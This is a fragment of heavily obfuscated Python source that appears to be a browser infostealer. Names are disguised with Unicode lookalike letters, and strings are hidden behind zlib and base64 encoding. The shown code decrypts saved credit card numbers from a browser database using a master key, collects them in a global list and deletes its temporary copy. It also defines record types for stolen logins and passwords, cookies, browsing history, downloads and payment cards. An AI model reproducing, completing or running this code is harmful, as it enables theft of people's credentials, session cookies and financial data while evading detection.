𝙧𝗼𝙬[𝗶𝙣𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 358 - (𝘪𝗻𝙩(𝘖) + 𝙞), 𝘮𝙖𝘱(__𝙞𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝘦𝗿(__𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\n5\x06\x00\x03\x83\x01P')).decode())] * 3)), 𝙧𝙖𝙣𝗴𝘦(1)), __𝘪𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝙤𝘸[𝙞𝙣𝘵.from_bytes(𝗺𝘢𝗽(lambda O, i: 380 - (𝘪𝙣𝘁(𝘖) + 𝗶), 𝗺𝘢𝙥(__𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝘵𝗲𝗿(__𝗶𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xadJ6\x01\x00\x03\xa0\x01_')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝘦(1)), __𝗶𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝗿𝗼𝙬[𝗶𝙣𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 872 - (𝙞𝘯𝙩(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝗶𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝘪𝙩𝙚𝙧(__𝙞𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3w\x894\x05\x00\x02\xf3\x01"')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝗲(1)), __𝙞𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝗿𝘰𝙬[𝘪𝗻𝘵.from_bytes(𝘮𝗮𝙥(lambda O, i: 902 - (𝗶𝗻𝘵(𝘖) + 𝙞), 𝙢𝗮𝘱(__𝙞𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝗶𝙩𝙚𝙧(__𝙞𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3w\xc96\x01\x00\x03\x16\x013')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝘦(1)), __𝘪𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙘𝘢𝙧𝗱_𝗻𝘶𝘮𝘣𝗲𝗿 = 𝙨𝘦𝘭𝙛.decrypt_password(𝘳𝘰𝘄[𝙞𝘯𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 369 - (𝙞𝙣𝘵(𝘖) + 𝘪), 𝙢𝙖𝙥(__𝙞𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝘪𝘁𝗲𝗿(__𝙞𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xad\x8a4\x02\x00\x03\x8a\x01S')).decode())] * 3)), 𝘳𝙖𝙣𝗴𝙚(1)), __𝘪𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝘦𝘭𝘧.master_key)
            __𝘾𝘈𝘙𝗗𝘚__.append(𝙏𝘺𝙥𝘦𝘀.CreditCard(𝗿𝘰𝘸[𝘪𝗻𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 487 - (𝗶𝗻𝘵(𝙊) + 𝘪), 𝙢𝙖𝗽(__𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘵𝗲𝘳(__𝘪𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝙣𝙜𝙚(0)), __𝘪𝗺𝗽𝙤𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝘄[𝘪𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 539 - (𝙞𝗻𝙩(𝘖) + 𝘪), 𝙢𝙖𝗽(__𝙞𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘁𝘦𝙧(__𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0b\xf15\x01\x00\x03\x06\x01$')).decode())] * 3)), 𝗿𝗮𝘯𝙜𝙚(1)), __𝗶𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝗼𝘸[𝙞𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 590 - (𝙞𝙣𝘵(𝙊) + 𝘪), 𝙢𝙖𝙥(__𝗶𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝘵𝘦𝙧(__𝗶𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0bI7\x01\x00\x03:\x01>')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝘦(1)), __𝘪𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘤𝗮𝘳𝙙_𝘯𝙪𝙢𝙗𝗲𝙧, 𝗿𝗼𝘸[𝘪𝙣𝙩.from_bytes(𝙢𝗮𝘱(lambda O, i: 406 - (𝙞𝙣𝘵(𝗢) + 𝙞), 𝘮𝙖𝘱(__𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝗶𝘁𝙚𝙧(__𝙞𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3sq\xac\x04\x00\x03\x03\x01M')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝙚(1)), __𝙞𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝘂𝗿𝙨𝙤𝗿.close()
        𝙘𝗼𝘯𝘯.close()
        𝘰𝘀.remove(__𝙞𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Types:

    class Login:

        def __init__(self, url, username, password):
            𝘴𝘦𝙩𝙖𝙩𝘁𝗿(𝙨𝘦𝘭𝙛, 'url', 𝙪𝘳𝗹)
            𝘴𝙚𝘵𝗮𝘵𝘁𝗿(𝘴𝘦𝗹𝙛, 'username', 𝘶𝘴𝙚𝘳𝙣𝗮𝙢𝗲)
            𝘴𝙚𝘁𝘢𝘵𝘁𝗿(𝙨𝘦𝙡𝗳, 'password', 𝗽𝘢𝘀𝘴𝘄𝗼𝗿𝙙)

        def __str__(self):
            return __𝘪𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝙨𝗲𝗹𝘧.url, 𝘀𝘦𝙡𝙛.username, 𝘴𝗲𝙡𝗳.password)

        def __repr__(self):
            return 𝘴𝗲𝘭𝙛.__str__()

    class Cookie:

        def __init__(self, host, name, path, value, expires):
            𝙨𝗲𝙩𝘢𝘁𝘵𝗿(𝙨𝗲𝗹𝗳, 'host', 𝘩𝙤𝘴𝘵)
            𝘴𝙚𝙩𝘢𝙩𝘁𝙧(𝙨𝘦𝘭𝗳, 'name', 𝘯𝘢𝙢𝙚)
            𝘀𝙚𝘁𝘢𝙩𝘁𝘳(𝘀𝘦𝙡𝘧, 'path', 𝙥𝘢𝘁𝙝)
            𝙨𝘦𝙩𝗮𝘵𝘵𝘳(𝘀𝘦𝙡𝘧, 'value', 𝘃𝘢𝙡𝙪𝗲)
            𝙨𝙚𝘁𝘢𝘁𝘵𝙧(𝙨𝘦𝙡𝙛, 'expires', 𝘦𝘅𝙥𝘪𝗿𝙚𝘴)

        def __str__(self):
            return __𝙞𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK56\xf0J\xc5\x8em\x01m\xd8\x07r')).decode().format(𝙨𝘦𝘭𝙛.host, __𝘪𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝙨𝙚𝙡𝙛.expires == 𝘪𝗻𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 910 - (𝙞𝙣𝘁(𝘖) + 𝙞), 𝙢𝙖𝗽(__𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝙩𝗲𝘳(__𝙞𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝘦(0)), __𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) else __𝘪𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝘀𝗲𝘭𝗳.path, __𝗶𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xcav\xf3\r5\x08\xb5\x05\x00\x0bu\x02h')).decode() if 𝙨𝙚𝘭𝗳.host.startswith(__𝙞𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode()) else __𝙞𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0bs\xf3\n\x0b\n\xb4\xb5\x05\x00\n\xfe\x02Z')).decode(), 𝙨𝘦𝗹𝗳.expires, 𝘀𝙚𝘭𝙛.name, 𝘀𝙚𝗹𝘧.value)

        def __repr__(self):
            return 𝘀𝗲𝗹𝗳.__str__()

    class WebHistory:

        def __init__(self, url, title, timestamp):
            𝙨𝗲𝙩𝙖𝘁𝘵𝘳(𝘴𝗲𝙡𝗳, 'url', 𝘶𝘳𝗹)
            𝘀𝘦𝙩𝗮𝘁𝘵𝙧(𝘴𝗲𝘭𝘧, 'title', 𝘁𝘪𝘁𝘭𝙚)
            𝘴𝙚𝘵𝙖𝙩𝙩𝙧(𝘴𝗲𝘭𝙛, 'timestamp', 𝘵𝙞𝘮𝙚𝘴𝘵𝘢𝗺𝙥)

        def __str__(self):
            return __𝙞𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56\xf0J\x85`[\x00\x15\\\x03*')).decode().format(𝘴𝙚𝗹𝙛.url, 𝘀𝘦𝙡𝙛.title, 𝙨𝗲𝘭𝗳.timestamp)

        def __repr__(self):
            return 𝘀𝘦𝗹𝗳.__str__()

    class Download:

        def __init__(self, tab_url, target_path):
            𝘀𝗲𝘁𝙖𝘁𝘵𝙧(𝘀𝘦𝗹𝗳, 'tab_url', 𝘁𝗮𝘣_𝙪𝗿𝘭)
            𝘴𝘦𝘁𝘢𝘁𝘁𝘳(𝘀𝗲𝗹𝗳, 'target_path', 𝘵𝘢𝗿𝘨𝘦𝙩_𝗽𝘢𝘁𝙝)

        def __str__(self):
            return __𝙞𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK56\xf0J56\xb0\x05\x00\t\xf1\x02\x18')).decode().format(𝘴𝙚𝗹𝙛.tab_url, 𝘀𝗲𝘭𝘧.target_path)

        def __repr__(self):
            return 𝘴𝙚𝙡𝘧.__str__()

    class CreditCard:

        def __init__(self, name, month, year, number, date_modified):
            𝘴𝗲𝘵𝗮𝙩𝘵𝗿(𝘀𝙚𝙡𝙛, 'name', 𝙣𝘢𝘮𝘦)
            𝘴𝘦𝘁𝙖𝘁𝙩𝘳(𝘴𝘦𝘭𝘧, 'month', 𝘮𝗼𝘯𝘁𝘩)
            𝙨𝙚𝘁𝗮𝙩𝘁𝗿(𝘀𝗲𝘭𝗳, 'year', 𝘺𝗲𝗮𝘳)
            𝘀𝘦𝘵𝗮𝘵𝘁𝘳(𝘴𝘦𝗹𝙛, 'number', 𝗻𝘶𝘮𝘣𝘦𝙧)
            𝙨𝙚𝘁𝗮𝘁𝘵𝗿(𝘀𝙚𝙡𝗳, 'date_modified', 𝙙𝗮𝘵𝙚_𝙢𝙤𝙙𝗶𝘧𝗶𝙚𝘥)

        def __str__(self):
            return __𝘪𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK56\xf0JE\xc5\xb6\x009\n\x05N')).decode().format(𝘴𝗲𝘭𝘧.name, 𝘀𝘦𝗹𝗳.month, 𝙨𝙚𝘭𝘧.year, 𝘴𝘦𝘭𝗳.number, 𝘀𝗲𝘭𝗳.date_modified)

        def __repr__(self):
            return 𝙨𝗲𝙡𝗳.__str__()